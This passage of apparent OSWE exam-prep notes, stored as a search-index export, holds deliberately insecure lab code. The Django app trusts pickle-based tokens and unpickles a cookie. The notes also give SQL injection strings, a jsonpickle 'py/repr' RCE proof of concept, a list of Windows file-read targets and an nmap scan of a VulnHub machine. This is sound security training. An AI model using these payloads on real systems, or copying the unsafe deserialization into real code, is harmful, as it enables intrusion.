SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = 'sz*h2fh58aa65t#efcs5rp6$wb&amp;6!c_n@^(54$-c2yc@8isuzc'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = env('DEBUG')\n\nALLOWED_HOSTS = ['*']\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'main',\n    'api',\n]\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nROOT_URLCONF = 'sqeakr.urls'\n\nTEMPLATES = [\n    {\n        \"BACKEND\": \"sqeakr.custom.Custom\",\n        \"DIRS\": [os.path.join(BASE_DIR, \"templates\")],\n        \"APP_DIRS\": True,\n    },\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [os.path.join(BASE_DIR, \"templates\")],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'sqeakr.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/2.2/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.postgresql',\n        'NAME': env('DATABASE'),\n        'USER': env('DB_USER'),\n        'PASSWORD': env('POSTGRES_PASSWORD'),\n        'HOST': env('DB_HOST'),\n        'PORT': env('DB_PORT'),\n    }\n}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/2.2/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/2.2/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/2.2/howto/static-files/\n\nSTATIC_URL = '/static/'\nSTATICFILES_DIRS = [\n    os.path.join(BASE_DIR, 'static'),\n]\n\nMEDIA_URL='/avatars/'\nMEDIA_ROOT=os.path.join(BASE_DIR, 'avatars')\n\n# Avatar uploads - used in api/views/userviews.py\nUPLOAD_DIR = '/tmp/'\nAVATAR_DIR = os.getcwd() + '/avatars/'\n\n# Registration Key\nREGISTRATION_KEY = '58d9ec3c-8588-11ea-af48-acde48001122'\nPICKLE_EXPECTED_LENGTH = int(env('PICKLE_EXPECTED_LENGTH'))\n</code></pre> <pre><code>../home/student/sqeakr/api/admin.py\n../home/student/sqeakr/api/tokens.py\n</code></pre> <p>/home/student/sqeakr/api/admin.py</p> <pre><code>from django.contrib import admin\n\n# Register your models here.\n</code></pre> <p>/home/student/sqeakr/api/tokens.py</p> <pre><code>import pickle\nimport pickletools\nimport base64\nimport json\nfrom uuid import UUID\n\nfrom .models import UserProfile\nfrom django.conf import settings\nfrom django.contrib.auth.hashers import make_password\nfrom django.core.exceptions import ObjectDoesNotExist\n\nEXPECTED_LENGTH = getattr(settings, 'PICKLE_EXPECTED_LENGTH', 100)\nclass Tokens():\n\n    allowedOps = [3, None, 0, 'auth', 1, 'userid', 2, 4, 62]\n    expected_length = EXPECTED_LENGTH\n    guest_uuid = '00000000-0000-4000-8000-000000000000'\n\n    @staticmethod\n    def create_token(userProfile):\n        data = {'auth':1,'userid':str(userProfile.userid) }\n        p = pickle.dumps(data)\n        return base64.b64encode(p).decode('utf-8')\n\n    @staticmethod\n    def create_guest_token():\n        data = {'auth':0,'userid':Tokens.guest_uuid}\n        p = pickle.dumps(data)\n        return base64.b64encode(p).decode('utf-8')\n\n    @staticmethod\n    def is_guest_token(token):\n        if Tokens.is_safe(token):\n            _data = pickle.loads(base64.b64decode(token))\n            if _data['userid'] == Tokens.guest_uuid:\n                return True\n\n        return False\n\n    @staticmethod\n    def validate_token(token):\n        if Tokens.is_safe(token):\n            data = pickle.loads(base64.b64decode(token))\n            if 'userid' in data.keys():\n                _userid = data['userid']\n                try: \n                    _profile = UserProfile.objects.get(userid=_userid)\n                    return _profile\n                except ObjectDoesNotExist:\n                    return None\n            else:\n                return None\n        else:\n            # log it?\n            return None\n\n    @staticmethod\n    def is_safe(token):\n        try:\n            for p in pickletools.genops(base64.b64decode(token)):\n                if not any(p[1] == op for op in Tokens.allowedOps):\n                    if not Tokens.validate_uuid4(p[1]):\n                        return False\n\n            if ((Tokens.expected_length - 5) &lt;=len(token) &lt;= (Tokens.expected_length + 5)):\n                return True\n            else:\n                return False\n        except:\n            # bad padding\n            return False\n\n    @staticmethod\n    def validate_uuid4(uuid_string):\n        try:\n            val = UUID(uuid_string, version=4)\n        except ValueError:\n            return False\n        return val.hex == uuid_string.replace('-', '')\n</code></pre> <p>/home/student/sqeakr/api/urls.py</p> <pre><code>from django.urls import path, re_path\n\nfrom api.views import userviews\nfrom api.views import sqeakviews\nfrom api.views import avatarviews\n\nurlpatterns = [\n    path('login', userviews.login, name='login'),\n    path('sqeaks', sqeakviews.get_sqeaks, name='get_sqeaks'),\n    path('compose', sqeakviews.compose, name='compose'),\n    path('register/new', userviews.profile_new, name='profile_new'),\n    path('draft', sqeakviews.draft, name='draft'),\n    path('profile', userviews.profile, name='profile'),\n    path('profile/update', userviews.update_user_profile, name='update_profile'),\n    path('profile/upload', avatarviews.upload_avatar, name='upload_avatar'),\n    path('profile/preview/&lt;img&gt;', avatarviews.preview_avatar, name='preview_avatar'),\n    path('profile/approve/&lt;img&gt;', avatarviews.approve_avatar, name='approve_avatar'),\n    path('profile/password', userviews.update_password, name='update_password'),\n    path('profile/&lt;username&gt;', userviews.get_user_profile, name='profile'),\n    path('sqeak/&lt;int:sqeak_id&gt;', sqeakviews.get_sqeak, name='get_sqeak'),\n    path('sqeak/&lt;int:sqeak_id&gt;/like', sqeakviews.like_sqeak, name='like_sqeak'),\n    re_path('avatars/(?P&lt;username&gt;[\\S]+)', avatarviews.get_avatars_for_username, name='get_avatars'),\n    path('&lt;username&gt;', sqeakviews.get_sqeaks_by_username, name='sqeaks'),\n]\n</code></pre> <p>/home/student/sqeakr/api/views/sqeakviews.py</p> <pre><code>from django.shortcuts import render\nfrom django.http import HttpResponse\nfrom django.http import JsonResponse\nfrom django.core import serializers\nfrom django.contrib.auth.hashers import make_password\nfrom django.core.exceptions import ObjectDoesNotExist\nfrom django.views.decorators.csrf import csrf_exempt\nfrom django.utils import timezone\nfrom ..models import Sqeak, UserProfile, Like \nfrom ..constants import NOSQEAK, METHOD, MISSING_AUTH\nfrom api.tokens import Tokens\nimport pickle\nimport base64\nimport json\n\n\ndef get_sqeaks(request):\n    \"\"\"\n    Endpoint for retrieving all sqeaks. Supports pagination via 'page'\n    and 'count' parameters.\n    \"\"\"\n    all_sqeaks = Sqeak.objects.all().order_by('-created_date')\n\n    page = 0\n    per_page = 25\n    try:\n        page = int(request.GET.get('page','0'))\n        per_page = int(request.GET.get('count','25'))\n    except:\n        pass\n\n    if None == all_sqeaks:\n        return JsonResponse(status=404, data={'status':'error','message':NOSQEAK})\n    else:\n        start = page * per_page\n        end = start + per_page\n\n        if len(all_sqeaks) &gt; end :\n            sqlist = all_sqeaks[start:end]\n        else:\n            sqlist = all_sqeaks[start:len(all_sqeaks)]\n\n        _userid = get_userprofile_id(request=request)\n\n        data = [sqeak.json() for sqeak in sqlist]\n        data = process_likes(data=data, userid=_userid)\n\n        return JsonResponse(data, safe=False)\n\n\ndef get_sqeak(request, sqeak_id):\n    \"\"\"\n    Endpoint for getting a single sqeak based on id value.\n    \"\"\"\n    if request.method == 'GET':\n        # do stuff\n        try:\n            _userid = get_userprofile_id(request=request)\n            sqeak = Sqeak.objects.get(pk=sqeak_id)\n            data = sqeak.json()\n\n            if None != _userid:\n                for l in data['likes']:\n                    if l['id'] == _userid:\n                        data['is_liked'] = True\n\n            return JsonResponse(data, safe=False)\n        except ObjectDoesNotExist:\n            return JsonResponse(status=404, data={'status':'error','message':NOSQEAK})\n    else:\n        return JsonResponse(status=405, data={'status':'error','message':METHOD})\n\ndef get_sqeaks_by_username(request, username):\n    \"\"\"\n    Endpoint for retrieving all sqeaks for a given user. Supports\n    pagination via 'page' and 'count' parameters.\n    \"\"\"\n    if request.method == 'GET':\n        # do stuff\n        try:\n            sqeaks = Sqeak.objects.filter(owner__username=username)\n            sqeaks = sqeaks.order_by('-created_date')\n\n            page = 0\n            per_page = 25\n            try:\n                page = int(request.GET.get('page','0'))\n                per_page = int(request.GET.get('count','25'))\n            except:\n                pass\n\n            start = page * per_page\n            end = start + per_page\n\n            if len(sqeaks) &gt; end :\n                sqlist = sqeaks[start:end]\n            else:\n                sqlist = sqeaks[start:len(sqeaks)]\n\n            data = [sqeak.json() for sqeak in sqlist]\n\n            _userid = get_userprofile_id(request=request)\n            data = process_likes(data=data, userid=_userid)\n\n            return JsonResponse(data, safe=False)\n        except ObjectDoesNotExist:\n            return JsonResponse(status=404, data={'status':'error','message':NOSQEAK})\n    else:\n        return JsonResponse(status=405, data={'status':'error','message':METHOD})\n\n\n\n@csrf_exempt\ndef compose(request):\n    \"\"\"\n    Endpoint for creating a new sqeak.\n    \"\"\"\n    if request.method == 'POST':\n        if 'authtoken' in request.headers:\n            _token = request.headers['authtoken']\n            _profile = Tokens.validate_token(_token)\n            # make sure we have a real user and not a guest\n            if None != _profile:\n                _txt = ''\n                # get the necessary data\n                if request.content_type == 'application/json':\n                    data = json.loads(request.body.decode('utf-8'))\n                    if 'sqeak' in data.keys():\n                        _txt = data['sqeak'].strip()\n                else:\n                    _txt = request.POST.get('sqeak').strip()\n\n                if '' != _txt:\n                    if len(_txt) &gt; 256:\n                        _txt = _txt[0:256]\n\n                    s = Sqeak(sqeak_text=_txt,owner=_profile,created_date=timezone.now())\n                    s.save()\n                    res = JsonResponse(status=201, data={'status':'ok','message':'Sqeak created'})\n                    # delete the draft cookie if it exists\n                    res.delete_cookie('draft')\n\n                    return res\n\n        return JsonResponse(status=401, data={'status':'error','message':MISSING_AUTH})\n    else:\n        return JsonResponse(status=405, data={'status':'error','message':METHOD})\n\n@csrf_exempt\ndef draft(request):\n    \"\"\"\n    Endpoint for saving a draft sqeak. Sqeak is saved as a cookie.\n    \"\"\"\n    if 'authtoken' in request.headers:\n        _token = request.headers['authtoken']\n        _profile = Tokens.validate_token(_token)\n        # make sure we have a real user and not a guest\n        if None != _profile:\n            if request.method == 'GET':\n                # convert draft pickle and return back the contents\n                _c = request.COOKIES.get('draft')\n                if None == _c:\n                    return JsonResponse({})\n                try:\n                    _txt = pickle.loads(base64.b64decode(_c))\n                    return JsonResponse({'status':'ok','sqeak':_txt})\n                except:\n                    return JsonResponse({})\n            elif request.method == 'POST':\n                # create draft pickle and return it \n                _txt = ''\n                # get the necessary data\n                if request.content_type == 'application/json':\n                    data = json.loads(request.body.decode('utf-8'))\n                    if 'sqeak' in data.keys():\n                        _txt = data['sqeak'].strip()\n                    else:\n                        _txt = request.POST.get('sqeak').strip()\n                    if '' != _txt:\n                        _p = pickle.dumps({'draft':_txt.strip()})\n                        _c = base64.b64encode(_p).decode('utf-8')\n                        _res = JsonResponse(status=201, data={'status':'ok','message':'Draft sqeak created'})\n                        _res.set_cookie('draft', _c, httponly=True)\n                    return _res \n                else:\n                    return JsonResponse(status=405, data={'status':'error','message':METHOD})\n            else:\n                return JsonResponse(status=401, data={'status':'error','message':MISSING_AUTH})\n    else:\n        return JsonResponse(status=401, data={'status':'error','message':MISSING_AUTH})\n\n@csrf_exempt\ndef like_sqeak(request, sqeak_id):\n    \"\"\"\n    This function takes a sqeak_id and a userprofile_id. If a Like matching\n    those values already exists, the active flag on it is flipped.\n    If no matching Like is found, one is created and set as active.\n    \"\"\"\n    if request.method == 'POST':\n        # first, get the user\n        if 'authtoken' in request.headers:\n            _token = request.headers['authtoken']\n            _profile = Tokens.validate_token(_token)\n            # make sure we have a real user and not a guest\n            if None != _profile:\n               # if we have a valid user token, get the sqeak\n                try:\n                    sqeak = Sqeak.objects.get(pk=sqeak_id)\n                    if None != sqeak:\n                        # see if we have a like\n                        try:\n                            like = Like.objects.get(owner__id=_profile.id, sqeak__id=sqeak.id)\n                            # if we do, togle active it\n                            active = not like.active \n                            like.active = active\n                            like.save()\n                            message = 'Sqeak liked'\n                            if active == False:\n                                message = 'Sqeak unliked'\n                            return JsonResponse(status=200, data={'status':'ok','message':message})\n                        except ObjectDoesNotExist:\n                            # if we don't have a Like, make one\n                            like = Like()\n                            like.owner = _profile\n                            like.sqeak = sqeak\n                            like.active = True\n                            like.save()      \n                            return JsonResponse(status=200, data={'status':'ok','message':'Sqeak liked'})\n                    else:\n                        return JsonResponse(status=404, data={'status':'error','message':NOSQEAK})\n                except ObjectDoesNotExist:\n                    return JsonResponse(status=404, data={'status':'error','message':NOSQEAK})\n\n        return JsonResponse(status=401, data={'status':'error','message':MISSING_AUTH})\n    else:\n        return JsonResponse(status=405, data={'status':'error','message':METHOD})\n\n\ndef get_userprofile_id(request):\n    \"\"\"\n    This function takes a request, checks it for an auth token,\n    and returns the userProfile associated with the token (if any).\n    \"\"\"\n    if 'authtoken' in request.headers:\n        _token = request.headers['authtoken']\n        _profile = Tokens.validate_token(_token)\n\n        if None != _profile:\n            return _profile.id\n\n    return None\n\ndef process_likes(data, userid):\n    \"\"\"\n    Given an array of json data (data), loop through it and mark \n    sqeaks as liked based on the provided userid\n    \"\"\"\n    if None != userid:\n        for d in data:\n            for l in d['likes']:\n                if l['id'] == userid:\n                    d['is_liked'] = True\n\n    return data\n</code></pre>"}, {"location": "OSWE/Course/CodeAnalysis/", "title": "Source code analysis", "text": "<p>It's common to place external libraries and dependencies lower on the priority list than application source files. With this in mind, there are many high-priority items to consider when performing manual source code analysis. This high-level list is presented in no particular order:</p> <ul> <li> <p>After checking unauthenticated areas, focus on areas of the application that are likely to receive less attention (i.e. authenticated portions of the application).</p> </li> <li> <p>Investigate how sanitization of the user input is performed. Is it done using a trusted, open-source library, or is a custom solution in place?</p> </li> <li> <p>If the application uses a database, how are queries constructed? Does the application parameterize input or simply sanitize it?</p> </li> <li> <p>Inspect the logic for account creation or password reset/recovery routines. Can the functionality be subverted?</p> </li> <li> <p>Does the application interact with its operating system? If so, can we modify commands or inject new ones?</p> </li> <li> <p>Are there programming language-specific vulnerabilities?</p> </li> </ul>"}, {"location": "OSWE/Course/CodeAnalysis/#debugging", "title": "Debugging", "text": "<p>Let's try debugging a simple Java application using Visual Studio Code. We will need to install two plugins: the <code>RedHat Language Support for Java</code> and the <code>Microsoft Debugger for Java</code>.</p> <p>DebuggerTest.java</p> <pre><code>import java.util.Random;\nimport java.util.Scanner;\n\npublic class DebuggerTest {\n\n  private static Random random = new Random();\n  public static void main(String[] args){\n    int num = generateRandomNumber();\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Guess a number between 1 and 100.\");\n        try{\n      int answer = scanner.nextInt();\n      scanner.close();\n      System.out.println(\"Your guess was: \" + answer);\n      if(answer == num) {\n        System.out.println(\"You are correct!\");\n      } else {\n        System.out.println(\"Incorrect. The answer was \" + num);\n      }\n    } catch(Exception e) {\n      System.out.println(\"That's not a number.\");\n    } finally {\n      scanner.close();\n    }\n    System.exit(0);\n  }\n\n  public static int generateRandomNumber() {\n    return random.nextInt(100)+1;\n  }\n}\n</code></pre> <p>Remote debugging</p>"}, {"location": "OSWE/Course/DotNet/", "title": ".Net", "text": "<pre><code>using System; \nnamespace dotnetapp \n{ \n    class Program \n    { \n        static void Main(string[] args) \n        { \n            Console.WriteLine(\"What is your favourite Web Application Language?\"); \n            String answer = Console.ReadLine(); \n            Console.WriteLine(\"Your answer was: \" + answer + \"\\r\\n\"); \n        } \n    } \n}\n</code></pre> <p><code>c:\\Users\\Administrator\\Desktop&gt;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe test.cs</code></p>"}, {"location": "OSWE/Course/Java/", "title": "Java", "text": "<pre><code>import java.util.*;\n\npublic class test{\n    public static void main(String[] args){\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"What is your favorite Web Application Language?\");\n        String answer = scanner.nextLine();\n        System.out.println(\"Your answer was: \" + answer);\n    }\n}\n</code></pre> <p>After compiling the source code, test.class is written to our JAR directory. In order to package our class as a JAR file, we will need to create a manifest file. This is easily accomplished by creating the <code>JAR/META-INF</code> directory and adding our test class to the <code>MANIFEST.MF</code> file as shown below.</p> <pre><code># compile java source code\n$ javac -source 1.8 -target 1.8 test.java\n\n# create manifest file\n$ mkdir META-INF\n\n$ echo \"Main-Class: test\" &gt; META-INF/MANIFEST.MF\n\n# create our JAR file\n$ jar cmvf META-INF/MANIFEST.MF test.jar test.class\n\n# test our example class\n$ java -jar test.jar\n</code></pre>"}, {"location": "OSWE/Course/Java/#java-web", "title": "Java Web", "text": "<p>Some Java applications use Servlet Mappings to control how the application handles HTTP requests. In Java web applications, there can be multiple entries in a <code>web.xml</code> file, each route is made up of two entries: one entry to define a servlet and a second entry to map a URL to a servlet.</p> <pre><code>&lt;!-- SubscriptionHandler--&gt;\n&lt;servlet id=\"SubscriptionHandler\"&gt;\n  &lt;servlet-name&gt;SubscriptionHandler&lt;/servlet-name&gt;\n  &lt;servlet-class&gt;org.opencrx.kernel.workflow.servlet.SubscriptionHandlerServlet&lt;/servlet-class&gt;\n    &lt;/servlet&gt;\n...\n&lt;servlet-mapping&gt;\n  &lt;servlet-name&gt;SubscriptionHandler&lt;/servlet-name&gt;\n    &lt;url-pattern&gt;/SubscriptionHandler/*&lt;/url-pattern&gt;\n&lt;/servlet-mapping&gt;\n</code></pre> <p>An example os Express.js routing</p> <pre><code>var express = require('express');\nvar router = express.Router();\n...\n\nrouter.get('/login', function(req, res, next) {\n  res.render('login', { title: 'Login' });\n});\n</code></pre> <p>A variant of this approach is routing by annotation or attribute. The <code>Spring MVC2</code> framework for Java and the <code>Flask</code> framework for Python, among others, use this approach. </p> <pre><code>@GetMapping({\"/admin/users\"})\npublic String getUsersPage(HttpServletRequest req, Model model, HttpServletResponse res) {\n...\n</code></pre>"}, {"location": "OSWE/Course/Python/", "title": "Python", "text": ""}, {"location": "OSWE/Course/Python/#interacting-with-web-listeners-using-python", "title": "Interacting with Web Listeners using Python", "text": "<pre><code>import requests\nfrom colorama import Fore, Back, Style \n\nrequests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)\n\nproxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}\n\ndef format_text(title,item): \n    cr = '\\r\\n'\n    section_break = cr + \"*\" * 20 + cr \n    item = str(item) \n    text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break \n    return text \n\nr = requests.get('https://manageengine:8443/',verify=False)\nprint(format_text('r.status_code is: ',r.status_code)) \nprint(format_text('r.headers is: ',r.headers)) \nprint(format_text('r.cookies is: ',r.cookies)) \nprint(format_text('r.text is: ',r.text))\n</code></pre>"}, {"location": "OSWE/Course/Python/#setting-up-a-virtual-environment", "title": "Setting up a virtual environment", "text": "<pre><code>$ python3 -m venv /path/to/venv\n$ source /path/to/venv/bin/activate\n\n$ deactivate\n</code></pre>"}, {"location": "OSWE/Post-course/BasicCommands/", "title": "Some Basic Commands", "text": ""}, {"location": "OSWE/Post-course/BasicCommands/#windows", "title": "Windows", "text": "<pre><code>dir | sort LastWriteTime | select -last 1\n\nGet-Content postgresql_11.log -wait -tail 1 | Select-String -Pattern \"select version\"\n\nGet-Content postgresql_24.log -tail 100 | Select-String -pattern \"(resourceid( &gt;|\\)|syntax error)\"\n\ntasklist | findstr /i calc\ntaskkill /f /IM calc.exe\n\n# restart IIS service\niisreset /noforce\n</code></pre>"}, {"location": "OSWE/Post-course/BasicCommands/#in-windows-the-equivalent-of-linuxs-etcpasswd-a-publicly-readable-file-containing-user-account-information-is", "title": "In Windows, the equivalent of Linux's /etc/passwd (a publicly readable file containing user account information) is:", "text": "<ol> <li>C:\\Windows\\System32\\drivers\\etc\\hosts</li> </ol> <p>Purpose: Maps hostnames to IP addresses (like /etc/hosts in Linux).</p> <p>Accessibility: Readable by all users (even unprivileged).</p> <p>Why it\u2019s a good target:</p> <p>Always exists in Windows.</p> <p>Often accessed in SSRF/file-read attacks.</p> <ol> <li>C:\\Windows\\win.ini</li> </ol> <p>Purpose: Legacy Windows configuration file (rarely used today).</p> <p>Accessibility: Readable by default.</p> <ol> <li>C:\\Windows\\System32\\config\\SAM (Restricted)</li> </ol> <p>Purpose: Stores password hashes (like /etc/shadow in Linux).</p> <p>Accessibility: Locked by SYSTEM (not readable without admin privileges).</p>"}, {"location": "OSWE/Post-course/BasicCommands/#compute-md5-hash", "title": "Compute MD5 hash", "text": "<pre><code>certutil -hashfile \"C:\\path\\to\\your\\file\" MD5\n\nGet-FileHash -Algorithm MD5 \"C:\\path\\to\\your\\file\" | Format-List\n\n(Get-FileHash -Algorithm MD5 \"C:\\path\\to\\your\\file\").Hash\n</code></pre>"}, {"location": "OSWE/Post-course/BasicCommands/#sql", "title": "SQL", "text": "<pre><code>select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where userid=1 union select 1;\n\nselect distinct(RESOURCEID) from AM_USERRESOURCESTABLE where userid=1 union select case when (select 1)=1 then 1 else 0 end;\n</code></pre>"}, {"location": "OSWE/Post-course/Cryptobank/", "title": "Crypto Bank", "text": "<p>https://www.vulnhub.com/entry/cryptobank-1,467/</p>"}, {"location": "OSWE/Post-course/Deserialization%20vul/", "title": "Why deserialization vulnerability exists?", "text": "<p>Deserialization exploits exist due to flaws in how applications handle serialized data. Serialization is the process of converting complex data structures (like objects) into a format that can be easily stored or transmitted (e.g., JSON, XML, or binary formats). Deserialization is the reverse process, where the serialized data is converted back into its original form (e.g., objects or data structures).</p> <p>Deserialization exploits occur when an attacker can manipulate the serialized data in such a way that, when deserialized, it causes unintended behavior in the application.</p> <p>In DotNetNuke, the main reason is lack of type checking when deserialize the serialized data.</p>"}, {"location": "OSWE/Post-course/Exploiting%20Jsonpickle%20to%20Get%20RCE/", "title": "Research: Exploiting Jsonpickle to Get RCE", "text": "<p>Source: https://www.vicarius.io/vsociety/posts/research-exploiting-jsonpickle-to-get-rce</p> <p>Introduction</p> <p>Jsonpickle is a python library which is widely used to serialize and deserialize python objects. Serialization is very useful to save state for an object and reconstruct the object from that state.</p> <p>In this post, we will exploit the latest jsonpickle library to get remote command execution.\u00a0</p> <p>Installation</p> <p>Jsonpickle is available on the Python Package Index (PyPI), a repository hosting over 10TB of packages that programmers use to build their applications. We install the library with the command, pip3 install jsonpickle.</p> <p>\\ Setting Up Jsonpickle</p> <p>For the scope of this article, we will focus on only two functions from the jsonpickle library: encode and decode.</p> <p>\\ First, we define a class named \u201czoo\u201d and create an object for it.</p> <p></p> <p>Figure 1: Creating a class and an object for it</p> <p>Now if we want to save the state of the object, we can encode the object with jsonpickle and print the byte stream, which can be used later to reconstruct the object with its state included.</p> <p></p> <p>Figure 2: Encoding the object with jsonpickle</p> <p>Conversely, we can reconstruct the object with a decode function.</p> <p></p> <p>Figure 3: Decoding the object with jsonpickle</p> <p>Attack Scenario</p> <p>Now that we\u2019ve demonstrated the two functions and how they work, we are ready to move forward with the attack.</p> <p>Since we are attacking the jsonpickle library, we create a sample web application with jsonpickle to attack.</p> <p>Our simple web application takes the base64 encoded serialized data and then decodes the base64 to jsonpickle object. And finally convert the jsonpickle object to actual object</p> <p></p> <p>Figure 4: Demonstrating encoding and decoding jsonpickle object</p> <p>So, when we run the application with flask run, we can pass our data to http://127.0.0.1:5000/data?serialized= to interact with jsonpickle library</p> <p></p> <p></p> <p>Creating the Exploit</p> <p>So, we create a class RCE with member function reduce which will execute our payload.</p> <p>\\ After creating the object, we need to serialize the object and encode it with base64 so it can be passed to our web application.</p> <p></p> <p>Figure 5: Creating RCE and a serialized object</p> <p>\\ Now we copy the base64 payload and pass it to our web application, and we see that the command execution is successful and we have compromised the application.</p> <p></p> <p></p> <p>Figure 6: Compromised application from base64 payload</p> <p>Key Takeaway</p> <p>The vulnerability is in the latest version of the jsonpickle library. As there are no fixes available, use of this library should be avoided. If the need to use jsonpickle still arises, ensure that jsonpickle does not handle unprocessed user data.</p>"}, {"location": "OSWE/Post-course/Exploiting%20Jsonpickle%20to%20Get%20RCE/#python-jsonpickle-200-remote-code-execution", "title": "python jsonpickle 2.0.0 - Remote Code Execution", "text": "<pre><code># Exploit Title: python jsonpickle 2.0.0 - Remote Code Execution\n# Date: 24-2-2021\n# Vendor Homepage: https://jsonpickle.github.io\n# Exploit Author: Adi Malyanker, Shay Reuven\n# Software Link: https://github.com/jsonpickle/jsonpickle\n# Version: 2.0.0\n# Tested on: windows, linux\n\n#   Python is an open source language. jsonickle module is provided to convert objects into a serialized form, \n#   and later recover the data back into an object. the decode is used to undeserialize serialized strings.\n\n#   If malicious data is deserialized, it will execute arbitrary Python commands. It is also possible to make system() calls. \n#   the problem is in the inner function loadrepr function which eval each serialized string which contains \"py/repr\".\n\n#   The vulnerability exists from the first version till the current version for backward compatibility. no patch is provided yet\n\n#   the payload was found during our research made on deserialization functions.\n\n#   the pattern should be :\n#   {..{\"py/repr\":&lt;the module to import&gt;/&lt;the command to be executed.&gt;}..}\n\n#   example:\n\nmalicious = '{\"1\": {\"py/repr\": \"time/time.sleep(10)\"}, \"2\": {\"py/id\": 67}}'\n\n#   the command on the server side\nsome_parameter = jsonpickle.decode(malicious)\n</code></pre>"}, {"location": "OSWE/Post-course/Trouble1/", "title": "Trouble1", "text": ""}, {"location": "OSWE/Post-course/Trouble1/#configuration-in-configphp", "title": "Configuration in config.php", "text": "<pre><code>&lt;?php\n   define('DB_SERVER', 'localhost');\n   define('DB_USERNAME', 'student');\n   define('DB_PASSWORD', 'studentlab');\n   define('DB_DATABASE', 'trouble1');\n   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);\n?&gt;\n</code></pre> <p>Create Mysql user student</p> <pre><code>CREATE USER 'student'@'localhost' IDENTIFIED BY 'studentlab';\nGRANT ALL PRIVILEGES ON * . * TO 'student'@'localhost';\n</code></pre> <p>Set up the database</p> <pre><code>service mysql start\nmysql -u root -p -e \"create database trouble1\"\nmysql -u root -p trouble1 &lt; lab.sql\n\n# drop database\nDROP DATABASE trouble1;\n</code></pre> <pre><code># cannot be accessed by Burp Suite\n$ sudo php -S localhost:8000\n\n# Make the server accessible on your network\n$ sudo php -S 0.0.0.0:8000 \n</code></pre>"}, {"location": "OSWE/Post-course/Trouble1/#mysql-injection-in-loginphp", "title": "Mysql injection in Login.php", "text": "<pre><code>SELECT id FROM users WHERE username = '$myusername' and SHA1(CONCAT(password, '$passtoken'))='$mypassword'\n\nSELECT id FROM users WHERE username = 'trouble1' and 1=1; -- \n\nSELECT id FROM admin WHERE username = 'trouble1' and 1=1; -- ' and SHA1(CONCAT(password, '$passtoken'))='$mypassword'\n</code></pre>"}, {"location": "OSWE/Post-course/devrandom-pipe/", "title": "devrandom-pipe", "text": "<p>PHP Deserialization VulnHub - Free</p> <p>https://www.vulnhub.com/entry/devrandom-pipe,124/</p>"}, {"location": "OSWE/Post-course/devrandom-pipe/#port-scan", "title": "Port Scan", "text": "<pre><code>$ sudo nmap 192.168.255.0/24 -p- -T4 --min-rate=10000 -sCV\n\nNmap scan report for 192.168.255.143\nHost is up (0.00042s latency).\nNot shown: 65531 closed tcp ports (reset)\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)\n| ssh-hostkey: \n|   1024 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f (DSA)\n|   2048 ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 (RSA)\n|   256 d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 (ECDSA)\n|_  256 7b:00:f7:dc:31:24:18:cf:e4:0a:ec:7a:32:d9:f6:a2 (ED25519)\n80/tcp    open  http    Apache httpd\n| http-auth: \n| HTTP/1.1 401 Unauthorized\\x0D\n|_  Basic realm=index.php\n|_http-server-header: Apache\n|_http-title: 401 Unauthorized\n111/tcp   open  rpcbind 2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100024  1          32913/udp   status\n|   100024  1          34859/tcp   status\n|   100024  1          41533/tcp6  status\n|_  100024  1          51307/udp6  status\n34859/tcp open  status  1 (RPC #100024)\nMAC Address: 00:0C:29:DC:FF:3D (VMware)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"}, {"location": "OSWE/Post-course/devrandom-pipe/#web-app", "title": "Web APP", "text": "<p>Visit port 